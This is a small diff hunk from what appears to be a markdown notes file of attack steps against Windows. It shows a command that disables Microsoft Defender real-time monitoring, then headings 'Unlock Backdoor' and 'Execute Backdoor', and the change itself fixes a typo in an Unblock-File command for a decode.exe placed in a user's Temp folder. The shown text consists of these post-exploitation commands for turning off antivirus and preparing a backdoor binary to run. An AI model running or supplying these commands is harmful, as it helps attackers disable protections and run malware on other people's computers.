@@ -69,7 +69,7 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 ```
 ## Unlock Backdoor
 ```
-Unblock-File -Path c:\Users\[User Name]]\AppData\LocalLow\Temp\decode.exe
+Unblock-File -Path c:\Users\[User Name]\AppData\LocalLow\Temp\decode.exe
 ```
 ## Execute Backdoor
 ```
